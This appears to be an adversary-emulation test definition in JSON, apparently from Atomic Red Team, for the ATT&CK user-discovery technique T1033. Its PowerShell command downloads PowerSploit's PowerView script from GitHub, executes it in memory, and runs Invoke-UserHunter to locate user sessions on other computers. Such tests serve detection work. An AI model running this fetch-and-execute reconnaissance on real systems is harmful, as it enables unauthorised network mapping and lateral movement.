@@ -1,0 +1,23 @@
+{
+    "name": "Find computers where user has session - Stealth mode (PowerView)",
+    "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1033",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "System Owner/User Discovery",
+    "source": "ART",
+    "uuid": "29857f27-a36f-4f7e-8084-4557cd6207ca",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
